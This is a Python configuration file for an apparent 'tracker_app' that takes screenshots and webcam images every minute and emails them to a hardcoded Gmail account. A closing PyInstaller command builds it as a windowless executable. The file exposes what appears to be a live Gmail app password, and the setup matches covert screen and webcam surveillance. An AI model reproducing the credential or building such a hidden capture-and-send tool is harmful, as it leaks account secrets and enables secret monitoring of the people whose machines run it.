# =============================================================================
# config.py — Central configuration for tracker_app
# All tunable settings live here. Edit this file to adjust behavior.
# =============================================================================

import os
import sys

# ---------------------------------------------------------------------------
# Paths
# ---------------------------------------------------------------------------
if getattr(sys, "frozen", False):
    BASE_DIR    = os.path.dirname(sys.executable)
    _BUNDLE_DIR = sys._MEIPASS
else:
    BASE_DIR    = os.path.dirname(os.path.abspath(__file__))
    _BUNDLE_DIR = BASE_DIR

TEMP_IMAGE_DIR  = os.path.join(BASE_DIR, "temp_images")
LOG_DIR         = os.path.join(BASE_DIR, "logs")
LOG_FILE        = os.path.join(LOG_DIR, "tracker.log")

# ---------------------------------------------------------------------------
# Capture settings
# ---------------------------------------------------------------------------
CAPTURE_INTERVAL_SECONDS = 60          # how often the main loop fires

# ---------------------------------------------------------------------------
# Image quality / compression
# ---------------------------------------------------------------------------
SCREENSHOT_FORMAT   = "JPEG"
WEBCAM_FORMAT       = "JPEG"
IMAGE_QUALITY       = 60               # JPEG quality 1-95 (lower = smaller file)
MAX_IMAGE_WIDTH     = 1280             # pixels; image is scaled down if wider
MAX_IMAGE_HEIGHT    = 720              # pixels; maintains aspect ratio

# ---------------------------------------------------------------------------
# Gmail — sender credentials
# ---------------------------------------------------------------------------
# SENDER_EMAIL  : the Gmail account that sends the email (must be YOUR account)
# SENDER_APP_PASSWORD : a 16-char Google App Password (NOT your regular password)
#   How to get one:
#     1. Go to https://myaccount.google.com/security
#     2. Enable 2-Step Verification (required)
#     3. Go to https://myaccount.google.com/apppasswords
#     4. Select app: Mail, device: Windows Computer → Generate
#     5. Copy the 16-character password shown (no spaces)
# RECIPIENT_EMAIL : where the captures are sent (can be same or different address)

SENDER_EMAIL        = "alphacuetechnologies@gmail.com"       # ← your Gmail address
SENDER_APP_PASSWORD = "tfss puzm hlxw wxkv"        # ← 16-char App Password
RECIPIENT_EMAIL     = "alphacuetechnologies@gmail.com"      # ← where to send captures

# Email subject template — {timestamp} is replaced at send time
EMAIL_SUBJECT       = "AlphaCue Update — {timestamp}"

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
LOG_LEVEL           = "DEBUG"          # DEBUG | INFO | WARNING | ERROR
LOG_MAX_BYTES       = 5 * 1024 * 1024  # 5 MB per log file before rotation
LOG_BACKUP_COUNT    = 3                # keep 3 rotated files

# ---------------------------------------------------------------------------
# Upload (send) retry
# ---------------------------------------------------------------------------
UPLOAD_MAX_RETRIES  = 3
UPLOAD_RETRY_DELAY  = 10              # seconds between retries

'''pyinstaller  --onefile  --noconsole  --name TrackerApp  --add-data "config.py;."  --hidden-import=cv2  --hidden-import=pyautogui  --hidden-import=PIL  --hidden-import=PIL._imagingtk  --hidden-import=smtplib  --hidden-import=email  main.py'''
